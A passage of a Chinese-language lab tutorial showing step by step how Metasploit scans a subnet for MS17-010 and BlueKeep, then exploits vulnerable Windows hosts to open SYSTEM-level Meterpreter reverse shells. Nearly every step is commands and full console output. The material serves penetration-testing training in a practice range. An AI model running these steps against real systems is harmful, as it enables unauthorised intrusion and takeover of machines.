+<p>常见的软件漏洞一般就算能拿到shell也是最低权限的shell，但是，感谢微软，一步到位system权限的漏洞是鉴中之鉴。————Neko205</p>
+</blockquote>
+<p>感谢msf，让一切变得简单轻松加愉快，特别是这种常见或者经典的漏洞。我们只需要找到漏洞的poc对内网进行扫描，找到漏洞设备，用exp发动攻击就好了。</p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> search ms17-010
+
+Matching Modules
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+
+   <span class="token comment">#  Name                                      Disclosure Date  Rank     Check  Description</span>
+   -  ----                                      ---------------  ----     -----  -----------
+   <span class="token number">0</span>  exploit/windows/smb/ms17_010_eternalblue  <span class="token number">2017</span>-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   <span class="token number">1</span>  exploit/windows/smb/ms17_010_psexec       <span class="token number">2017</span>-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   <span class="token number">2</span>  auxiliary/admin/smb/ms17_010_command      <span class="token number">2017</span>-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   <span class="token number">3</span>  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   <span class="token number">4</span>  exploit/windows/smb/smb_doublepulsar_rce  <span class="token number">2017</span>-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index. For example info <span class="token number">4</span>, use <span class="token number">4</span> or use exploit/windows/smb/smb_doublepulsar_rce
+</code></pre><p><code>use 3</code></p>
+<p>设置ip，设置线程数。也可以使用options来查看相信设置</p>
+<p><code>set rhost 192.168.43.155/24</code></p>
+<p>对整个网段进行扫描</p>
+<p><code>set threads 100</code></p>
+<p>设置100的线程数</p>
+<p>run</p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
+
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.76:445     - Rex::ConnectionRefused: The connection was refused by the remote <span class="token function">host</span> <span class="token punctuation">(</span><span class="token number">192.168</span>.43.76:445<span class="token punctuation">)</span>.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445     - Host is likely VULNERABLE to MS17-010<span class="token operator">!</span> - Windows Server <span class="token number">2008</span> R2 Standard <span class="token number">7600</span> x64 <span class="token punctuation">(</span><span class="token number">64</span>-bit<span class="token punctuation">)</span>
+</code></pre><p>这就是找到了，这时候切到exp模块</p>
+<p><code>use 0</code></p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_ms17_010<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use <span class="token number">0</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+</code></pre><p>这里的设置和当时设置监听模块差不多，可以通过opt看一下本地ip是否正确，然后配置被攻击设备的ip</p>
+<p><code>set rhosts 192.168.43.62</code></p>
+<p>run</p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>msf6 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.43.155:4444 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445     - Host is likely VULNERABLE to MS17-010<span class="token operator">!</span> - Windows Server <span class="token number">2008</span> R2 Standard <span class="token number">7600</span> x64 <span class="token punctuation">(</span><span class="token number">64</span>-bit<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445     - Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - The target is vulnerable.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - Connecting to target <span class="token keyword keyword-for">for</span> exploitation.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - Connection established <span class="token keyword keyword-for">for</span> exploitation.
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - Target OS selected valid <span class="token keyword keyword-for">for</span> OS indicated by SMB reply
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - CORE raw buffer dump <span class="token punctuation">(</span><span class="token number">36</span> bytes<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - 0x00000000  <span class="token number">57</span> <span class="token number">69</span> 6e <span class="token number">64</span> 6f <span class="token number">77</span> <span class="token number">73</span> <span class="token number">20</span> <span class="token number">53</span> <span class="token number">65</span> <span class="token number">72</span> <span class="token number">76</span> <span class="token number">65</span> <span class="token number">72</span> <span class="token number">20</span> <span class="token number">32</span>  Windows Server <span class="token number">2</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - 0x00000010  <span class="token number">30</span> <span class="token number">30</span> <span class="token number">38</span> <span class="token number">20</span> <span class="token number">52</span> <span class="token number">32</span> <span class="token number">20</span> <span class="token number">53</span> <span class="token number">74</span> <span class="token number">61</span> 6e <span class="token number">64</span> <span class="token number">61</span> <span class="token number">72</span> <span class="token number">64</span> <span class="token number">20</span>  008 R2 Standard 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - 0x00000020  <span class="token number">37</span> <span class="token number">36</span> <span class="token number">30</span> <span class="token number">30</span>                                      <span class="token number">7600</span>      
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - Target arch selected valid <span class="token keyword keyword-for">for</span> arch indicated by DCE/RPC reply
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - Trying exploit with <span class="token number">12</span> Groom Allocations.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - Sending all but last fragment of exploit packet
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - Starting non-paged pool grooming
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - Sending SMBv2 buffers
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - Closing SMBv1 connection creating <span class="token function">free</span> hole adjacent to SMBv2 buffer.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - Sending final SMBv2 buffers.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - Sending last fragment of exploit packet<span class="token operator">!</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - Receiving response from exploit packet
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - ETERNALBLUE overwrite completed successfully <span class="token punctuation">(</span>0xC000000D<span class="token punctuation">)</span><span class="token operator">!</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - Sending egg to corrupted connection.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - Triggering <span class="token function">free</span> of corrupted buffer.
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">200774</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.43.62
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">2</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.43.155:4444 -<span class="token operator">&gt;</span> <span class="token number">192.168</span>.43.62:49158<span class="token punctuation">)</span> at <span class="token number">2023</span>-12-07 <span class="token number">19</span>:55:14 +0800
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - <span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - <span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-WIN-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.43.62:445 - <span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>-<span class="token operator">=</span>
+
+meterpreter <span class="token operator">&gt;</span> 
+</code></pre><p>当出现WIN的字样并且跳出shell就证明成功了</p>
+<pre data-role="codeBlock" data-info="" class="language-text text"><code>meterpreter &gt; sysinfo
+Computer        : WIN-37KNDA6U40V
+OS              : Windows 2008 R2 (6.1 Build 7600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x64/windows
+</code></pre><pre data-role="codeBlock" data-info="" class="language-text text"><code>meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre><p>该说不说，权限比传木马还高</p>
+<h2>cve2019-0708 Windows RDP的RCE漏洞</h2>
+<p>和上面差不多，但是这个漏洞很容易蓝屏盖，所以一般不建议实战使用，poc确定漏洞就可以报送了。不过我们这里是靶场环境，那就可以玩玩getshell</p>
+<p><code>search cve 2019 0708</code></p>
+<p>先用poc扫一遍</p>
+<p><code>use0</code></p>
+<pre data-role="codeBlock" data-info="" class="language-text text"><code>msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; set rhosts 192.168.43.155/24
+rhosts =&gt; 192.168.43.155/24
+msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; set threads 100
+msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; run
+[+] 192.168.43.63:3389    - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
+</code></pre><p>切exp</p>
+<pre data-role="codeBlock" data-info="" class="language-text text"><code>msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; use 1
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set rhosts 192.168.43.63
+rhosts =&gt; 192.168.43.63
+</code></pre><p>除了正常的基础配置这个漏洞还需要将target配置到合适的参数，我们的目标是windows7那么就将target设为1</p>
+<pre data-role="codeBlock" data-info="" class="language-text text"><code>Exploit target:
+
+   Id  Name
+   --  ----
+   1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
+</code></pre><p>run</p>
+<pre data-role="codeBlock" data-info="" class="language-text text"><code>msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; run
+
+[*] Started reverse TCP handler on 192.168.43.155:4444 
+[*] 192.168.43.63:3389 - Running automatic check ("set AutoCheck false" to disable)
+[*] 192.168.43.63:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
+[+] 192.168.43.63:3389    - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
+[*] 192.168.43.63:3389    - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.43.63:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
+[*] 192.168.43.63:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8013200000, Channel count 1.
+[!] 192.168.43.63:3389 - &lt;---------------- | Entering Danger Zone | ----------------&gt;
+[*] 192.168.43.63:3389 - Surfing channels ...
+[*] 192.168.43.63:3389 - Lobbing eggs ...
+[*] 192.168.43.63:3389 - Forcing the USE of FREE'd object ...
+[!] 192.168.43.63:3389 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;
+[*] Sending stage (200774 bytes) to 192.168.43.63
+[*] Meterpreter session 3 opened (192.168.43.155:4444 -&gt; 192.168.43.63:49327) at 2023-12-07 20:22:48 +0800
+
+meterpreter &gt; 
+</code></pre><pre data-role="codeBlock" data-info="" class="language-text text"><code>meterpreter &gt; sysinfo
+Computer        : USER-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : zh_CN
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre><p>可以看到当时在run的是很脚本有提示一个进入危险区，如果在这时候强制结束脚本设备就会蓝屏，当然可能也不需要手动结束，网络不稳定，传输不稳定，都有可能导致蓝屏</p>
+<p><img src="image/msf%E5%B7%A5%E5%85%B7%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/1701952053051.png" alt="1701952053051"></p>
+<p>ok结束。</p>
+
+      </div>
+      
+      
+    
+    
+    
+    
+    
+    
+  
+    </body></html>
